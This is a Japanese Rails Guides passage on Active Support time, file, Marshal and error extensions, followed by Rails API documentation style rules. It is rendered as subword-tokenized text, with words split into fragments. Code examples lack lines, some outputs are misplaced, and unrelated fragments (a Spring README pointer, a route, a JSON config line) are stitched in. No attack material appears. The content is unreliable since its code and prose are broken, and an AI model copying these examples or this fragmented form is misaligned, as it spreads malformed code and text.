▁ now . u t c ▁# ▁=> ▁Mon , ▁ 07 ▁Ju n ▁2010 ▁ 23 : 27 : 5 2 ▁+0000
▁` get u t c ` は このメソッド の別名 です 。
▁#### # ▁` u t c ?
▁` u t c ?` 述 語 は 、 レシーバ が その タイムゾーン に 合 った UTC 時刻 を 持 っている かどうかをチェックし ます 。
▁ now ▁= ▁ DateTime . now ▁# ▁=> ▁Mon , ▁ 07 ▁Ju n ▁2010 ▁ 19 : 30 : 4 7 ▁- 04 00
▁# ▁=> ▁true
▁ 日 時 を 移動 する 最も 一般的な 方法は ` advance ` メソッド を使用すること です 。
▁このメソッドは `: year s `、` : month s `、` : week s `、` : day s `、` : hour s `、` : minute s ` および `: sec on d s ` を キー に 持つ ハッシュ を受け取り 、 日 時 を できる だけ 詳 細 な 形式 で 、 現在の キー で 示 される とおり に 返します 。
▁d ▁= ▁ DateTime . current
▁# ▁=> ▁ T h u , ▁0 5 ▁A ug ▁2010 ▁ 11 : 3 3 : 3 1 ▁+0000
▁d . advance ( year s : ▁1, ▁ month s : ▁1, ▁ day s : ▁1, ▁ hour s : ▁1, ▁ minute s : ▁1, ▁ sec on d s : ▁1 )
▁# ▁=> ▁Tue , ▁ 06 ▁S e p ▁20 11 ▁ 12 : 3 4 : 3 2 ▁+0000
▁続いて 、 算 出 された 時点 まで の 経 過 秒 数 を元に ` since ` メソッドを 呼び出し 、 時間 を 補 正 します 。
▁この 実行 順序 には 意味 があります 。 極 端 な ケース では 、 順序 が 変わる と 計算 結果 も 異なる 場合 があります 。
▁これは 上の ` Date # advance ` で示した 例 で 適 用 されます 。 相 対 的な 時間 の 計算 において も 計算 の 順序 は 同様に 重要です 。
▁ も し 仮 に 日付 部分を 先に 進め ▁( 前 述 した とおり 、 相 対 的な 計算 順序 があります ) 、 続いて 時間 の 部分 も 先に 進め ると 、 以下のような 計算 結果 が 得られ ます 。
▁d ▁= ▁ DateTime . new (201 0, ▁ 2, ▁ 28 , ▁2 3, ▁ 59 , ▁ 59 )
▁# ▁=> ▁Sun , ▁ 28 ▁F e b ▁2010 ▁ 23 : 59 : 59 ▁+0000
▁d . advance ( month s : ▁1, ▁ sec on d s : ▁1 )
▁# ▁=> ▁Mon , ▁2 9 ▁Ma r ▁2010 ▁ 00 : 00 : 00 ▁+0000
▁今度は 順序 を 変え て 計算 すると 、 結果 が 異なります 。
▁d . advance ( sec on d s : ▁1 ). advance ( month s : ▁1 )
▁# ▁=> ▁ T h u , ▁0 1 ▁A p r ▁2010 ▁ 00 : 00 : 00 ▁+0000
▁WARN ING : ▁` DateTime ` は 夏 時間 ▁( D S T ) ▁ を 考 慮 しません 。 算 出 された 時間 が 最終的に 存在しない 時間 になって も 警 告 や エラー は 発生 しません 。
▁` change ` メソッドを使用して 、 レシーバ の 日 時の 一部の 要素 だけ を更新し た 新しい 日 時 を得る ことができます 。 変更 する 要素 として は 、`: year `、` : month `、` : day `、` : hour `、` : m in `、` : sec `、` : of f set `、` : start ` など が 指定できます 。
▁ now ▁= ▁ DateTime . current
▁# ▁=> ▁Tue , ▁ 08 ▁Ju n ▁2010 ▁0 1 : 5 6 : 22 ▁+0000
▁ now . change ( year : ▁20 11 , ▁of f set : ▁ R ation al ( - 6 , ▁2 4 ) )
▁# ▁=> ▁We d , ▁ 08 ▁Ju n ▁20 11 ▁0 1 : 5 6 : 22 ▁- 06 00
▁ 時 ▁( hour ) ▁ が ゼ ロ の場合 、 分 と 秒 も 値を 与え られ ない 限 り 同様に ゼ ロ になります 。
▁ now . change ( hour : ▁0 )
▁# ▁=> ▁Tue , ▁ 08 ▁Ju n ▁2010 ▁ 00 : 00 : 00 ▁+0000
▁ 同様に 、 分 が ゼ ロ の場合 、 秒 も 値を 与え られ ない 限 り ゼ ロ になります 。
▁ now . change ( m in : ▁0 )
▁# ▁=> ▁Tue , ▁ 08 ▁Ju n ▁2010 ▁0 1 : 00 : 00 ▁+0000
▁ DateTime . current . change ( month : ▁ 2, ▁ day : ▁ 30 )
▁ 日 時 に対して 期 間 を 加 減 算 できます 。
▁# ▁=> ▁Mon , ▁0 9 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁ now ▁+ ▁1. year
▁# ▁=> ▁Tue , ▁0 9 ▁A ug ▁20 11 ▁ 23 : 15 : 17 ▁+0000
▁ now ▁- ▁1. week
▁# ▁=> ▁Mon , ▁0 2 ▁A ug ▁2010 ▁ 23 : 15 : 17 ▁+0000
▁ DateTime . new ( 15 8 2, ▁10 , ▁4 , ▁ 23 ) ▁+ ▁1. hour
▁# ▁=> ▁F ri , ▁ 15 ▁ O ct ▁ 15 8 2 ▁ 00 : 00 : 00 ▁+0000
▁` Time ` の 拡 張
▁NOT E : ▁ これらは すべて 同じ 定義ファイル ` active _ support / core _ ext / time / c al c ul ation s . rb ` に あります 。
▁Active ▁Support は 、` DateTime ` で 使用できる メソッドの 多く を ` Time ` に追加 しています 。
▁ p a st ?
▁to day ?
▁f u t ur e ?
▁ sec on d s _ since _ m id n ig h t
▁ advance
▁ これらは 同様に 動作します 。
▁ 関連する ドキュメント を参照 し 、 以下の 相 違 点 についても 把 握 して おいてください 。
▁* ▁` change ` メソッドは 追加 の `: u sec ` も 受け 付け ます 。
▁* ▁` Time ` は 夏 時間 ▁( D S T ) ▁ を 理解 します 。 以下のように 夏 時間 を 正しく 算 出 できます 。
▁ Time . zone _ default
▁# ▁=> ▁#< ActiveSupport :: Time Z one : 0 x 7 f 7 3 6 5 4 d 4 f 3 8 ▁@ u t c _ of f set = nil , ▁@ name =" M ad r id ", ▁ ...
▁# ▁ バ ル セ ロ ナ では 夏 時間 により 20 10 / 0 3 / 28 ▁0 2 : 00 ▁+ 0 100 が 20 10 / 0 3 / 28 ▁0 3 : 00 ▁+ 0 200 になる
▁t ▁= ▁ Time . local (201 0, ▁ 3, ▁ 28 , ▁1, ▁ 59 , ▁ 59 )
▁# ▁=> ▁Sun ▁Ma r ▁ 28 ▁0 1 : 59 : 59 ▁+ 0 100 ▁2010
▁t . advance ( sec on d s : ▁1 )
▁# ▁=> ▁Sun ▁Ma r ▁ 28 ▁0 3 : 00 : 00 ▁+ 0 200 ▁2010
▁* ▁` since ` や ` ago ` の 移動 先 の 時間 が ` Time ` で 表現 できない 場合 、` DateTime ` オブジェクトが 代わりに 返 されます 。
▁#### ▁` Time . current `
▁Active ▁Support では 、` Time . current ` を定義し て 現在の タイムゾーン における 「 今 日 」 を 定 め ています 。
▁このメソッドは ` Time . now ` と似ています が 、 ユーザー 定義 の タイムゾーン がある場合 に それ を 考 慮 する 点が 異なります 。
▁Active ▁Support では ` p a st ?` 、` to day ?` 、` f u t ur e ?` を 示す インスタンス 述 語 も 定義 され ており 、 これらは すべて この ` Time . current ` を 起 点 に しています 。
▁ユーザー 定義 の タイムゾーン を 考 慮 する メソッドを使用して 日付 を 比 較 したい場合 、` Time . now ` ではなく 必ず ` Time . current ` を使用して ください 。
▁ 将来 、 ユーザー 定義 の タイムゾーン が システム の タイムゾーン と 比 較 される こと があり え ます 。 システム の タイムゾーン では デフォルトで ` Time # now ` が使用されます 。
▁つまり 、` Time . now ` が ` Time . current y es ter day ` と 等 しく な ること があり え る ということです 。
▁#### ▁` all _ day `、` all _ week `、` all _ month `、` all _ quarter `、` all _ year `
▁` all _ day ` メソッドは 、 現在 時刻 を含む その 日 一 日 を表す 範囲 を返します 。
▁ now ▁= ▁ Time . current
▁# ▁=> ▁Mon , ▁0 9 ▁A ug ▁2010 ▁ 23 : 20 : 0 5 ▁ UTC ▁+00:00
▁ now . all _ day
▁# ▁=> ▁Mon , ▁0 9 ▁A ug ▁2010 ▁ 00 : 00 : 00 ▁ UTC ▁+00:00 . .
▁Mon , ▁0 9 ▁A ug ▁2010 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁ 同様に 、` all _ week `、` all _ month `、` all _ quarter `、` all _ year ` も 時間 の 範囲 を 生成 できます 。
▁ now . all _ week
▁Sun , ▁ 15 ▁A ug ▁2010 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁ now . all _ week (: s un day )
▁# ▁=> ▁Sun , ▁ 16 ▁S e p ▁20 12 ▁ 00 : 00 : 00 ▁ UTC ▁+00:00 . .
▁S at , ▁ 22 ▁S e p ▁20 12 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁ now . all _ month
▁# ▁=> ▁S at , ▁0 1 ▁A ug ▁2010 ▁ 00 : 00 : 00 ▁ UTC ▁+00:00 . .
▁Tue , ▁3 1 ▁A ug ▁2010 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁ now . all _ quarter
▁# ▁=> ▁ T h u , ▁0 1 ▁Ju l ▁2010 ▁ 00 : 00 : 00 ▁ UTC ▁+00:00 . .
▁ T h u , ▁ 30 ▁S e p ▁2010 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁ now . all _ year
▁# ▁=> ▁F ri , ▁0 1 ▁ J an ▁2010 ▁ 00 : 00 : 00 ▁ UTC ▁+00:00 . .
▁F ri , ▁3 1 ▁D ec ▁2010 ▁ 23 : 59 : 59 ▁ UTC ▁+00:00
▁### ▁ 時間 コ ン スト ラ ク タ
▁ Time . current
▁# ▁=> ▁F ri , ▁ 06 ▁A ug ▁2010 ▁ 17 : 11 : 5 8 ▁C E S T ▁+ 0 2 : 00
▁` DateTime ` と同様 、 述 語 ` p a st ?` と ` f u t ur e ?` は ` Time . current ` を 起 点 とします 。
▁ 構成 される 時間 が 、 実行 プラットフォーム の ` Time ` で サポート される 範囲 を 超 え ている 場合は 、 u sec は 破 棄 され 、` DateTime ` オブジェクトが 代りに 返 されます 。
▁ Time オブジェクト に対して 期 間 を 加 減 算 できます 。
▁# ▁=> ▁Tue , ▁0 9 ▁A ug ▁20 11 ▁ 23 : 2 1 : 11 ▁ UTC ▁+00:00
▁# ▁=> ▁Mon , ▁0 2 ▁A ug ▁2010 ▁ 23 : 2 1 : 11 ▁ UTC ▁+00:00
▁ Time . u t c ( 15 8 2, ▁10 , ▁3 ) ▁+ ▁5 . day s
▁# ▁=> ▁Mon ▁ O ct ▁ 18 ▁ 00 : 00 : 00 ▁ UTC ▁ 15 8 2
▁` File ` の 拡 張
▁### ▁` a to m i c _ write `
▁` File . a to m i c _ write ` クラス メソッドを使用すると 、 書き かけ の 文 章 を 誰 にも 読 まれ ないように ファイル を保存する ことができます 。
▁このメソッド に ファイル名 を 引数として 渡す と 、 書き 込 み 用 に オープン された ファイル ハ ンド ル を生成します 。
▁ ブロック が 完了 すると 、` a to m i c _ write ` は ファイル ハ ンド ル を ク ロー ズ して 処理 を 完了 します 。
▁Action ▁P ack は 、 このメソッド を 利用 して ` all . css ` などの キャッシュ ファイル への 書き 込 み を 行った り しています 。
▁ File . a to m i c _ write ( join ed _ asset _ path ) ▁do ▁| cache |
▁ cache . write ( join _ asset _ file _ content s ( asset _ path s ) )
▁` a to m i c _ write ` は 、 処理 を 完了 するために 一時 的な ファイル を作成します 。
▁ ブロック 内の コードが 実際に 書き 込 む の はこの ファイル です 。
▁ 完了 時に はこの 一時 ファイルは リ ネ ー ム されます 。 リ ネ ー ム は 、 P OS I X システム の ア ト ミ ッ ク 操作 に基いて 行われます 。
▁ 書き 込 み 対象 ファイル 既に が存在する 場合 、` a to m i c _ write ` は それ を 上 書き して オ ー ナ ー と パ ー ミ ッ ション を保持し ます 。
▁ただし 、` a to m i c _ write ` メソッドが ファイルの オ ー ナ ー シ ッ プ と パ ー ミ ッ ション を変更 できない ケース が まれ に あります 。 この エラー は キャッチ され 、 その ファイルが それ を 必要 と する プロセス から アクセス できるように するために 、 ユーザーの ファイル システム への 信 頼 を スキップ します 。
▁NOT E : ▁` a to m i c _ write ` が 行なう ch mod 操作 が 原 因 で 、 書き 込 み 対象 ファイルが A C L セット を 持 っている ときに その A C L が 再 計算 / 変更 されます 。
▁WARN ING : ▁` a to m i c _ write ` で 追 記 を行なう ことはできません 。
▁この 補 助 ファイルは 標準 の 一時 ファイル 用 ディレクトリ に 書き 込 まれ ます が 、 2 番目の 引数 で ディレクトリ を直接 指定 することもできます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / file / a to m i c . rb ` です 。
▁` M ar sh al ` の 拡 張
▁### ▁` load `
▁Active ▁Support は 、` load ` に 一 定 の 自動 読み込み サポート を追加します 。
▁たとえば 、 ファイル キャッシュ スト ア では 以下のように 非 直 列 化 ▁( de s e ri al ize ) ▁ します 。
▁ File . o p en ( file _ name ) ▁ { ▁| f | ▁Ma r sh al . load ( f ) ▁ }
▁ キャッシュ データ が 不 明 な 定数 を参照 している 場合 、 自動 読み込み が トリガ されます 。 読み込み に成功した場合 は 非 直 列 化 を 透 過 的に 再 試 行 します 。
▁WARN ING : ▁ 引数 が ` I O ` の場合 、 再 試 行 を 可能 に するために ` re w in d ` に応答する 必要があります 。
▁ 通常の ファイルは ` re w in d ` に 応答 します 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / m ar sh al . rb ` です 。
▁` Name Error ` の 拡 張
▁Active ▁Support は ` Name Error ` に ` m is s ing _ name ?` メソッド を追加します 。 このメソッドは 、 引数として 渡 された 名前 が 原 因 で 例外 が発生する かどうか をテストします 。
▁ 渡 される 名前 は シンボル または 文字列 です 。
▁ シンボル を 渡 した 場合は 単なる 定数 名を テスト し 、 文字列を 渡 した 場合は フル パス ▁( full y - qualified ) ▁ の 定数 名 をテストします 。
▁ TIP : ▁ シンボル は `: " ActiveRecord :: Base " ` で 行 な っている の と同じ ように フル パス の 定数 として 表 す ことができます 。 シンボル が その ように 動作する のは それ が 便 利 だ から であり 、 技術 的に そう し なければならない という もの ではありません 。
▁たとえば 、` Article sController ` の アクション が 呼び出される と 、 Rails は その 名前 から すぐ に 推測 できる ` Article Helper ` を使用し よう とします 。
▁ここでは この ヘルパー モジュール が存在し て い なくても 問題 は ないので 、 この 定数 名 で 例外 が発生し ても 例外 として 扱 わ ずに 黙 殺 する必要があります 。
▁しかし 、 実際に 不 明 な 定数 が 原 因 で ` articles _ helper . rb ` が ` Name Error ` エラー を 発生 する という 場合 が 考え られます 。
▁ そのような 場合は 、 改 め て 例外を発生 させ なく て は なり ません 。
▁` m is s ing _ name ?` メソッドは 、 この 2 つの 場合 を 区別 するために 使用されます 。
▁def ▁ default _ helper _ module !
▁ module _ name ▁= ▁name . sub ( / Controller $ / , ▁' ')
▁ module _ path ▁= ▁ module _ name . underscore
▁ helper ▁ module _ path
▁ raise ▁ e ▁ unless ▁ e . is _ m is s ing ?
▁" helpers / # { module _ path } _ helper "
▁ raise ▁ e ▁ unless ▁ e . m is s ing _ name ?
▁" # { module _ name } Helper "
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / name _ error . rb ` です 。
▁` L o ad Error ` の 拡 張
▁` is _ m is s ing ?` は 、 パス 名を 引数に 取り 、 特定の ファイルが 原 因 で 例外 が発生する かどうか をテストします ▁( ". rb " 拡張子 が 原 因 と 思 わ れる 場合 を 除 きます )。
▁たとえば 、` Article sController ` の アクション が 呼び出される と 、 Rails は ` articles _ helper . rb ` を 読み 込 もう とします が 、 この ファイルは 存在しない ことがあります 。
▁ ヘルパー モジュール は 必 須 では ないので 、 Rails は 読み込み エラー を 例外 扱 い せずに 黙 殺 します 。
▁しかし 、 ヘルパー モジュール が 存在しない ために 別の ライブラリ が 必要 になり 、 それ が さらに 見つからない という 場合 が 考え られます 。
▁Rails は そのような 場合には 例外 を 再 発生 させ なければなりません 。
▁` is _ m is s ing ?` メソッドは 、 この 2 つの 場合 を 区別 するために 使用されます 。
▁NOT E : ▁ 定義ファイル の場所は ` active _ support / core _ ext / load _ error . rb ` です 。
▁ 他の 環境で 実行 したい場合は
▁[ Spring ▁ README ]( https :// github . com / rails / s p r ing # rake ) を参照してください 。
▁ 使用する プラグイン はすべて gem に 展開 して Gemfile に追加 し なければなりません 。
▁# ▁self . include _ root _ in _ json ▁= ▁false
▁get ▁' c la sh ing / : id ' ▁=> ▁' test # example ', ▁as : ▁: example
▁API ▁ ドキュメント 作成 ガイド ラ イン
▁ 本ガイドで は 、 Rails ▁API ドキュメント 作成 の ガイド ラ イン について解説します ( 訳 注 : ▁API ドキュメント が 英語 で 書かれ る ことを前提とし ます 。 また 、 サンプル の コメント は 基本的に 英語 の ま ま に しています )。
▁* ▁API ドキュメント を 効果 的に 書く 方法
▁* ▁ ドキュメント 作成 用の スタイル ガイド ▁( Ruby コード 開発 用の スタイル ガイド とは 別 )
▁[ Rails ▁API ▁ ドキュメント ]( http :// api . rubyonrails . org ) は [ R D o c ]( http :// doc s . s e a tt l erb . org / rdoc / ) を使用して 生成されます 。
▁bundle ▁exec ▁rake ▁ rdoc
▁ 生成された HTML ファイルは . / doc / rdoc ディレクトリ に 置かれます 。
▁ R D o c の 記 法 に 関 して は 、[ m ar k up ]( http :// doc s . s e a tt l erb . org / rdoc / R D o c / M ar k up . html ) を参照してください ( 訳 注 : ▁ 別 ページ ですが [ 日 本 語 の R D o c ライブラリ 解 説 ]( http :// doc s . ruby - lang . org / j a / 2.1 . 0 / lib r ary / rdoc . html ) があります )。 [ 追加 の ディレクティブ ]( http :// doc s . s e a tt l erb . org / rdoc / R D o c / P ar s er / Ruby . html ) にも 目 を通して おいてください 。
▁ 語 調
▁ 簡潔 かつ 宣言 的に 書くこと 。
▁ 簡潔 さ は それ だけで 長 所 になります 。
▁ 現在 形 で 書くこと 。 " Re t ur n ed ▁a ▁ hash ▁that ... " ▁ や ▁" W i ll ▁ return ▁a ▁ hash ▁that ... " ▁ ではなく " Re t ur n s ▁a ▁ hash ▁that ... " のように 書く 。
▁ コメント の 英語 は 大文字 で 始 め ること 。
▁ 句 読 点 や 記 号 の 用 法 は 常 識 に従う こと 。
▁# ▁D ec la re s ▁ an ▁ attribute ▁ reader ▁ b ack ed ▁ by ▁ an ▁ internal ly - name d
▁# ▁ instance ▁ variable .
▁def ▁ attr _ internal _ reader ( * attr s )
▁ 読者 に 現 時点 の 最新の 方法 が 伝 わ るように 書くこと 、 それ も 明 示 的 かつ 暗 黙 に 。
▁ 先 進 的な 分 野 で 推 奨 されている 慣 用 表現 を使用すること 。
▁ 推 奨 される 方法 が 強 調 される よう セクション の 順序 に 注意 し 、 必要 であれば 順序 を 入 れ 替 え ること 。
▁ 作成する ドキュメント 自身 が Rails の ベ スト プ ラ ク テ ィ ス の よい モデル となる ように 、 そして Rails の 最 新 かつ 模 範 的な 使用 法 になる ように 書くこと 。
▁ ドキュメント は 簡潔 であり 、 かつ 全体 を 理解 できる もの であること 。
▁ 例外 的な ケース についても 調 査 し 、 ドキュメント に 盛 り 込 む こと 。
▁ ある モジュール が 無 名 で あった ら どう な る か 。
▁ ある コレクション の内容 が 空 で あった ら どう な る か 。
▁ 引数 が nil で あった ら どう な る か 。
▁Rails の コンポーネント 名 は 語 の間に スペース を 1 つ 置 く 表 記 を 正 式 な もの と する ▁( 例 : ▁" Active ▁Support ")
▁なお 、` ActiveRecord ` は Ruby モジュール 名 だ が 、 Active ▁Record は O R M を指す 。
▁Rails ドキュメント 内で コンポーネント を指す 場合には 常に 正 式 名 称 を使用すること 。 ブログ 投 稿 や プ レ ゼ ン テ ー ション など でも この 点 に 留 意 し 、 異なる 名 称 で 読者 など を 驚 か せ ないように すること 。
▁ 正しい ス ペ ル を使用すること ▁( A re l 、 Test :: U n it 、 RSpec 、 HTML 、 ▁ MySQL 、 JavaScript 、 ERB など )。 大文字 小文字 にも 注意 すること 。
▁ 疑 わ しい 場合には 公式 ドキュメント など 、 信 頼 できる 情報 源 を参照 すること 。
▁" SQL " ▁という 語 の 前に は 冠 詞 ▁" an " ▁ を 付け ること ▁( 例 : ▁" an ▁ SQL ▁ state m ent ") 。
▁ 同様に 、 " an ▁ SQLite ▁ database " のように すること 。
▁" y o u " や " y our " を使用する 表現 を避ける こと 。
▁以下の 例 文 では y o u が 3 度 も 使用されている 。
▁` ` ` m ar k d own
▁I f ▁you ▁ n e ed ▁to ▁use ▁` return ` ▁ state m ent s ▁in ▁your ▁c all b ack s , ▁it ▁is ▁ re com m end ed ▁that ▁you ▁ ex p li c it ly ▁def in e ▁the m ▁as ▁ method s .
▁以下の スタイル で 書くこと 。
▁I f ▁` return ` ▁is ▁ n e ed ed ▁it ▁is ▁ re com m end ed ▁to ▁ ex p li c it ly ▁def in e ▁a ▁ method .
▁ 同様に 、 説明 上 何らかの 人 物 を 仮 定 して 、 その 人 物 を 代 名 詞 で 呼 ぶ 場合 ▁( " a ▁ user ▁with ▁a ▁ session ▁ cookie " ▁ など ) 、 h e や sh e のような 性 別の ある 代 名 詞 を 避 け 、 the y / the ir / the m のような 性 別 に 影 響 され ない 代 名 詞 を使用すること 。
▁ 以下のように 言 い 換 え る 。
▁* ▁ h e または sh e ▁-> ▁the y に置き換え る
▁* ▁ h im または her ▁-> ▁the m に置き換え る
▁* ▁ h is または her ▁-> ▁the ir に置き換え る
▁* ▁ h is または her s ▁-> ▁the ir s に置き換え る
▁* ▁ h im self または her self ▁-> ▁the m s e l ve s に置き換え る
▁ 英語
▁ ア メ リ カ 英語 を使用すること ▁( ▁* c ol or * ▁ 、 ▁* center * ▁ 、 ▁* mod ul ar ize * ▁ など )。
▁ 詳 細 は [ ア メ リ カ 英語 と イ ギ リ ス 英語 の ス ペ ル の違い ]( http :// en . w ikipedia . org / wiki / A me ri ca n _ and _ B r it i sh _ E n g li sh _ s p e ll ing _ difference s ) ▁( 英語 ) ▁ を参照してください 。
▁ サンプル コード
▁ 意味 のある サンプル コードを 選 ぶ こと 。 概 要 と 基本 を 端 的に 示 し 、 かつ 興 味 深 い 点 や 落 と し 穴 も 示 されている の が 理 想 です 。
▁ サンプル コードの インデント には スペース 2 文字 を使用すること 。 マークアップ 用 には 左 マージ ン に合わせて スペース 2 文字 を使用します 。
▁ サンプル コードの 例 は [ Rails コ ー デ ィ ング ルール に従う ]( con t ri b u t ing _ to _ ruby _ on _ rails . html # rails % E 3 % 8 2 % B 3 % E 3%83% B C % E 3%83% 8 7 % E 3 % 8 2 % A 3 % E 3%83% B 3 % E 3 % 8 2 % B 0 % E 3%83% A B % E 3%83% B C % E 3%83% A B % E 3 % 8 1 % A B % E 5 % B E % 9 3 % E 3 % 8 1 % 8 6 ) を参照してください 。
▁ 短 い ドキュメント では 、 ス ニ ペ ッ ト を 紹 介 する 際に " E x am p le s " と 明示的に ラ ベ ル を 付け る 必要 は ない 。 単 に パ ラ グ ラ フ に従う ようにします 。
▁# ▁C on ver t s ▁a ▁ collection ▁of ▁ e le m ent s ▁in to ▁a ▁ formatted ▁ string ▁ by
▁# ▁c all ing ▁+ to _ s + ▁on ▁ all ▁ e le m ent s ▁and ▁ join ing ▁the m .
▁# ▁B log . all . to _ formatted _ s ▁# ▁=> ▁" F ir st ▁P o st S e con d ▁P o st T h ir d ▁P o st "
▁ 逆 に 大きな 章 で 構成 されている ドキュメント であれば 、 " E x am p le s " セクション を 設 け ても よい 。
▁# ▁= = = = ▁ E x am p le s
▁# ▁ Person . exists ? (
▁# ▁ Person . exists ? ('
▁name : ▁" David ")
▁# ▁ Person . exists ? ( ['
▁name ▁ L I K E ▁ ? ', ▁" % # { query } % "] )
▁ 式 の 実行 結果 は 式 に 続けて 書き 、 冒 頭 に ▁" # ▁=> ▁" ▁ を追加して 縦 を 揃 え ること 。
▁# ▁1. e ve n ?
▁# ▁1. o d d ?
▁# ▁2 . e ve n ?
▁# ▁2 . o d d ?
▁1 つの 行 が 長 く なり すぎる 場合は コメント を 次の 行 に 置 いて も よい
▁# ▁ label (: article , ▁: title )
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> T it le </ label >
▁# ▁ label (: article , ▁: title , ▁" A ▁ sh or t ▁ title ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title "> A ▁ sh or t ▁ title </ label >
▁# ▁ label (: article , ▁: title , ▁" A ▁ sh or t ▁ title ", ▁class : ▁" title _ label ")
▁# ▁# ▁=> ▁< label ▁for =" article _ title " ▁class =" title _ label "> A ▁ sh or t ▁ title </ label >
▁ 実行 結果を 示す ために ` put s ` や ` p ` などの 印 字 用 メソッド を使用すること は なるべく 避 け る 。
▁ 逆 に 、 ( 実行 結果を 示 さ ない ) ▁ 通常の コメント では 矢 印 を使用し ないこと 。
▁# ▁ p o ly m or ph i c _ url ( record ) ▁# ▁ s am e ▁as ▁ comment _ url ( record )
▁ 論理値
▁ 述 語 や フラグ で の 論理値 の 表 記 は 、 正 確 な 値 表現 よりも 、 論理値 の 意味 を 優 先 すること 。
▁" true " および " false " を Ruby の 定義 ど お り に 使用する 場合は 、 通常の フ ォ ン ト で 表 記 すること 。
▁ シ ング ル ト ン の ` true ` および ` false ` は 等 幅 フ ォ ン ト で 表 記 すること ( 訳 注 : ▁ シ ング ル ト ン の ` true ` および ` false ` とは 、` T r u e Class ` および ` F al s e Class ` の 唯 一 の インスタンス の ことです )。
▁" tr u th y " のような 用 語 は 避 け てください 。 Ruby では 言語 レベル で true と false が 定義されている ので 、 これらの 用 語 は 技術 的に 厳 密 な 意味 が与えられ ており 、 言 い 方 を 変え る 必要はありません 。
▁ 経験 から 申 し 上 げ ると 、 どう しても 必要な 場合 を 除 いて 、 ドキュメント で シ ング ル ト ン を使用 すべき ではありません 。
▁ シ ング ル ト ン を避ける ことで 、` ! !` や 三 項 演算子 のような 人 工 的な 表現 を避ける ことができ 、 リファクタリング も し や す く なります 。 さらに 、 実装 で 呼び出される メソッドが 返す 値 の 表現 が 少し でも 違 う と コードが 正常に動作し ない という 事 態 も 避 け られます 。
▁` config . action _ mailer . perform _ deliver ies ` ▁ spec if ies ▁ w h e the r ▁ mail ▁ will ▁a ct u all y ▁be ▁ deliver ed ▁and ▁is ▁true ▁ by ▁ default ▁( 訳 : ▁` config . action _ mailer . perform _ deliver ies ` は 、 メール を 実際に 配信 する かどうかを指定します 。 デフォルト値 は true です 。 )
▁上の 例 では 、 フラグ の デフォルト値 の 実際の 表現 が ど れ である か ▁( 訳 注 : ▁ シ ング ル ト ン の true な のか 、 true と 評価 される オブジェクト な のか ) ▁ を 知 る 必要はありません 。 従って 、 論理値 の 意味 だけ を ドキュメント に 書く べ き です 。
▁ 以下 は 述 語 の例 です 。
▁# ▁ Re t ur n s ▁true ▁if ▁the ▁ collection ▁is ▁ empty . ▁( 訳 : コレクション が 空 なら true を返す )
▁# ▁I f ▁the ▁ collection ▁has ▁be en ▁ load ed ▁( コレクション が 読み込まれ ると )
▁# ▁it ▁is ▁ equ i v al ent ▁to ▁< tt > collection . size . z er o ? </ tt > . ▁if ▁the ▁( < tt > collection . size . z er o ? </ tt > と 同 値 )
▁# ▁ collection ▁has ▁ not ▁be en ▁ load ed , ▁it ▁is ▁ equ i v al ent ▁to ▁( コレクション が 読み込まれ なかった 場合は )
▁# ▁< tt > collection . exists ? </ tt > . ▁I f ▁the ▁ collection ▁has ▁ not ▁ al read y ▁be en ▁( < tt > collection . exists ? </ tt > と 同 値 。 コレクション が 読み込まれ て お らず 、 )
▁# ▁ load ed ▁and ▁you ▁are ▁ g o ing ▁to ▁f e t ch ▁the ▁ record s ▁ any w a y ▁it ▁is ▁be tt er ▁to ▁( どう しても レコード を取り出し たい場合は )
▁# ▁ check ▁< tt > collection . length . z er o ? </ tt > . ▁( < tt > collection . length . z er o ? </ tt > をチェックする こと )
▁def ▁ empty ?
▁if ▁ load ed ?
▁ size . z er o ?
▁@ t ar get . blank ?
▁この API は 特定の 値 に コミット し ないように 注意 が 払 わ れ ており 、 メソッド には 述 語 と 意味 が 示 されています 。 これ で 十分 です 。
▁ ファイル名
▁ 経験 則 から も 、 ファイル名 は Rails アプリケーションの ルート ・ ディレクトリ から の 相 対 パス で 記述 すること 。
▁config / routes . rb ▁# ▁ Y E S
▁ routes . rb ▁# ▁ N O
▁ R A I L S _ R O O T / config / routes . rb ▁# ▁ N O
▁ フ ォ ン ト
▁### ▁ 等 幅 フ ォ ン ト
▁以下の 場合は 等 幅 フ ォ ン ト を使用すること 。
▁* ▁ 定数 、 特に クラス名 および モジュール 名
▁* ▁ メソッド 名
▁* ▁ 次のような リ テ ラ ル : ▁` nil `、` false `、` true `、` self `
▁* ▁ シンボル
▁* ▁ メソッドの パラメータ
▁* ▁ ファイル名
▁class ▁ Array
▁# ▁C all s ▁+ to _ param + ▁on ▁ all ▁it s ▁ e le m ent s ▁and ▁ join s ▁the ▁ re s ul t ▁with
▁# ▁ s la sh es .
▁This ▁is ▁use d ▁ by ▁+ url _ for + ▁in ▁Action ▁P ack .
▁ co ll e ct ▁ { ▁| e | ▁ e . to _ param ▁ } . join ▁' / '
▁WARN ING : ▁ 等 幅 フ ォ ン ト を ` + ... + ` という マークアップ で 表 記 できる のは 、 通常の メソッド 名 、 シンボル 、 パス ▁( 通常の ス ラ ッ シ ュ を 使用している もの ) ▁ のような シンプルな もの に 限 られます 。
▁ これら よりも 複雑な もの を 表 記 するときに は 必ず ` < tt > ... </ tt > ` で マークアップ してください 。 特に 名前空間 を 使用している クラス名 や モジュール 名 では 必 須 です ▁( ` < tt > ActiveRecord :: Base </ tt > ` など )。
▁以下の コマンドで 、 R D o c の 出力 を 手 軽 に 確認 できます 。
▁$ ▁ e ch o ▁" + : to _ param + " ▁| ▁ rdoc ▁-- p ip e
▁# => ▁< p >< code > : to _ param </ code ></ p >
▁### ▁ Re g ul ar フ ォ ン ト
▁Ruby の キーワード でない 、 英語 として の " true " と " false " には re g ul ar フ ォ ン ト ▁( I t a li c や B ol d でない フ ォ ン ト ) ▁ を使用すること 。
▁# ▁ R un s ▁ all ▁the ▁ validations ▁with in ▁the ▁ spec ified ▁ con text .
